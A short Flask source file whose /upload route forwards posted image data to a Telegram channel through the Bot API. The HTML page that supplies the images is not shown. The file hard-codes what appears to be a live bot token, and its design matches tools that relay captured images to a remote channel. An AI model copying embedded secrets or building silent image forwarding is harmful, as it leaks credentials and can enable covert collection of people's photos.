from flask import Flask, render_template, request
import requests
import time

app = Flask(__name__)

# Replace with your Telegram Bot API token
TELEGRAM_BOT_TOKEN = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'

# Replace with your Telegram channel username or ID
TELEGRAM_CHANNEL = '@localipy'


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/upload', methods=['POST'])
def upload():
    image_data = request.form['image_data']
    
    # Save the image locally or process it as needed
    # For this example, we're simply sending the image to the Telegram channel
    
    # Construct the Telegram API URL
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    
    # Send the image to the Telegram channel
    response = requests.post(url, data={'chat_id': TELEGRAM_CHANNEL}, files={'photo': image_data})
    
    if response.status_code == 200:
        return 'Photo uploaded successfully'
    else:
        return 'Error uploading photo'


if __name__ == '__main__':
    # Start the Flask development server
    app.run()
